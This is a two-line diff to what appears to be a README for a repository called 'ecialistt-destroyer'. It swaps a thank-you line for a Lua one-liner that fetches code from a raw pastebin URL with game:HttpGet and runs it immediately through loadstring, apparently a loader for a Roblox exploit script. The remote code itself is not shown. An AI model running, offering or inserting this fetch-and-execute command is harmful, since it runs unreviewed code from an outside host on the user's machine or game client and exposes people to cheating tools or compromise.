@@ -1,2 +1,2 @@
 # ecialistt-destroyer
-Thanks use this :3
+loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
